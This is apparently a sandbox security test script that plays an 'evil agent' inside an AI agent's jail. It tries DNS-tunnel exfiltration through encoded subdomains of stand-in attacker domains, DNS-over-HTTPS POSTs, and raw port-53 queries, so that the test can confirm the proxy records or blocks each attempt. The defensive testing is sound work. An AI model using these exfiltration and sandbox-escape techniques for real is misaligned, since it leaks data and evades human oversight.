"""Evil agent: exfiltrate through DNS.

Runs INSIDE the jail, as the agent's user (python3 -c). Usage:
<script> <tag> <marker> <allowed host> <canary name> <secret label>
Prints one JSON object on its last line. ``marker`` is a unique label the test looks for in the
fake resolver's log. ``canary`` is an allowed name that no container answers for: the proxy must
resolve it through the fake resolver, which proves the test would see a query if one left.
``secret label`` is a made-up key that the redaction knows by its shape (never a real one).

Since T10-3 reads to unknown hosts pass (decision 1), so a name is a way out: the proxy resolves
the host of a read it lets through. What the gate still does, and what this checks:

- ``through_proxy``: plain reads (CONNECT then GET, and absolute-form http://) of long encoded
  subdomains of an attacker domain. They pass, but only once recorded: the proxy resolves a host
  after backtide has the request in the black box, never before (the test compares the times).
- ``guarded``: what decision 1's guard holds, so its name is never resolved: a read whose host
  carries a secret (risk 3), a read whose URL is over 2 KiB, and a DNS-over-HTTPS POST (a write:
  every write is held). The client gives up after a few seconds; the holds stay open, unresolved.
- ``direct``: raw UDP and TCP on port 53 to Docker's embedded resolver (127.0.0.11), to two
  outside addresses and to the proxy. The outside ones are documentation addresses (RFC 5737), so
  even a jail that had regressed would send nothing to a real resolver (invariant 8); the script
  also reports whether the jail has a default route at all (/proc/net/route), sending nothing.
  Docker's resolver may answer locally (NXDOMAIN, or REFUSED): its rcode is reported.

The control resolves and reaches the allowed host, to show the way out still works for it.
"""

import http.client
import json
import socket
import ssl
import struct
import sys

tag, marker, allowed, canary, secret = sys.argv[1:6]
GIVE_UP = 4  # seconds: a held request keeps its connection longer; the hold stays open
PROXY = ("backtide-proxy", 8080)
CONTEXT = ssl.create_default_context(cafile="/etc/backtide-ca/ca.pem")
# Long encoded labels, as a DNS tunnel would carry stolen bytes. Each name holds the marker.
EXFIL_NAMES = [
    f"{marker}-{'a1b2c3d4e5' * 4}.exfil.example",
    f"data-{'0123456789abcdef' * 2}-{marker}.tunnel.attacker.test",
]
DOH_HOSTS = ["dns.google", "cloudflare-dns.com", "1.1.1.1"]


def plain(target: str, path: str, timeout: float = 15) -> object:
    """Absolute-form http:// to the proxy (port 80), for a name the proxy would have to resolve."""
    conn = http.client.HTTPConnection(*PROXY, timeout=timeout)
    try:
        conn.request("GET", f"http://{target}/{path}", headers={"Host": target})
        return conn.getresponse().status
    except (OSError, http.client.HTTPException) as error:
        return f"{type(error).__name__}"
    finally:
        conn.close()


def tunnel(target: str, port: int = 443, path: str = "dns", timeout: float = 15) -> object:
    """CONNECT target:443, then an HTTPS GET inside: the request is what the proxy decides on
    (the CONNECT only opens the tunnel, lazily, without resolving anything yet)."""
    where = f"[{target}]:{port}" if ":" in target else f"{target}:{port}"
    try:
        with socket.create_connection(PROXY, timeout=timeout) as sock:
            sock.sendall(f"CONNECT {where} HTTP/1.1\r\nHost: {where}\r\n\r\n".encode())
            head = b""
            while b"\r\n\r\n" not in head and len(head) < 8192:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                head += chunk
            if not head.startswith(b"HTTP/") or int(head.split(b" ", 2)[1]) != 200:
                return f"CONNECT: {head[:60]!r}"
            with CONTEXT.wrap_socket(sock, server_hostname=target) as tls:
                request = f"GET /{tag}/{path} HTTP/1.1\r\nHost: {target}\r\n\r\n"
                tls.sendall(request.encode())
                line = tls.recv(200).split(b"\r\n", 1)[0]
                return int(line.split(b" ", 2)[1]) if line.startswith(b"HTTP/") else repr(line)
    except (OSError, ValueError) as error:
        return f"{type(error).__name__}"


def dns_query(name: str) -> bytes:
    ident = 0x1234
    header = struct.pack("!HHHHHH", ident, 0x0100, 1, 0, 0, 0)
    question = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"
    return header + question + struct.pack("!HH", 1, 1)


def answer(reply: bytes) -> str:
    """``rcode=N ancount=M`` of a DNS reply (3 is NXDOMAIN, 5 REFUSED, 2 SERVFAIL)."""
    if len(reply) < 12:
        return "short"
    flags, _qd, ancount = struct.unpack("!HHH", reply[2:8])
    return f"rcode={flags & 0xF} ancount={ancount}"


def direct_udp(resolver: str, name: str) -> str:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.settimeout(4)
        sock.sendto(dns_query(name), (resolver, 53))
        return answer(sock.recvfrom(2048)[0])
    except OSError as error:
        return f"{type(error).__name__}"
    finally:
        sock.close()


def direct_tcp(resolver: str, name: str) -> str:
    try:
        with socket.create_connection((resolver, 53), timeout=4) as sock:
            packet = dns_query(name)
            sock.sendall(struct.pack("!H", len(packet)) + packet)
            reply = sock.recv(2048)
            return answer(reply[2:]) if reply else "closed"
    except OSError as error:
        return f"{type(error).__name__}"


def default_route() -> bool:
    """Whether the jail has a default route (destination 00000000 in /proc/net/route)."""
    try:
        with open("/proc/net/route") as routes:
            return any(line.split()[1] == "00000000" for line in list(routes)[1:] if line.split())
    except OSError:
        return False


def doh(host: str) -> object:
    """DNS-over-HTTPS (RFC 8484) through the proxy: a POST of /dns-query with the packet."""
    conn = http.client.HTTPSConnection(*PROXY, timeout=GIVE_UP, context=CONTEXT)
    conn.set_tunnel(host, 443)
    try:
        conn.request(
            "POST",
            f"/{tag}/dns-query",
            body=dns_query(f"{marker}-doh.exfil.example"),
            headers={
                "content-type": "application/dns-message",
                "accept": "application/dns-message",
            },
        )
        return conn.getresponse().status
    except (OSError, http.client.HTTPException) as error:
        return f"{type(error).__name__}"
    finally:
        conn.close()


def control() -> object:
    conn = http.client.HTTPSConnection(*PROXY, timeout=20, context=CONTEXT)
    conn.set_tunnel(allowed, 443)
    try:
        conn.request("GET", f"/{tag}/dns-control")
        return conn.getresponse().status
    except (OSError, http.client.HTTPException) as error:
        return f"{type(error).__name__}"
    finally:
        conn.close()


through_proxy = {}
for name in EXFIL_NAMES:
    through_proxy[f"CONNECT {name}"] = tunnel(name)
    through_proxy[f"http {name}"] = plain(name, f"{tag}/dns-exfil")

# What decision 1's guard holds before any name is resolved (each name carries its own label).
secret_name = f"{secret}.{marker}-s.exfil.example"
long_name = f"{marker}-l.exfil.example"
guarded = {
    "secret_name": tunnel(secret_name, timeout=GIVE_UP),
    "long_url": tunnel(long_name, path="long?d=" + "a1b2c3d4" * 300, timeout=GIVE_UP),
    "doh_post": {host: doh(host) for host in DOH_HOSTS},
}

# Documentation addresses (RFC 5737) stand for outside resolvers: never a real one (invariant 8).
resolvers = ["127.0.0.11", "192.0.2.53", "198.51.100.53", "backtide-proxy"]
direct = {}
for resolver in resolvers:
    name = f"{marker}-{resolver.replace('.', '-')}.direct.exfil.example"
    direct[f"udp {resolver}"] = direct_udp(resolver, name)
    direct[f"tcp {resolver}"] = direct_tcp(resolver, name)

# Last, the canary: an allowed name that no container answers for. The proxy resolves it (the
# answer is NXDOMAIN, so the agent gets an error) and the test requires its query in the log.
canary_status = plain(canary, f"{tag}/canary")

print(
    json.dumps(
        {
            "through_proxy": through_proxy,
            "guarded": guarded,
            "secret_name": secret_name,
            "long_name": long_name,
            "direct": direct,
            "control": control(),
            "canary": canary_status,
            "default_route": default_route(),
        }
    )
)
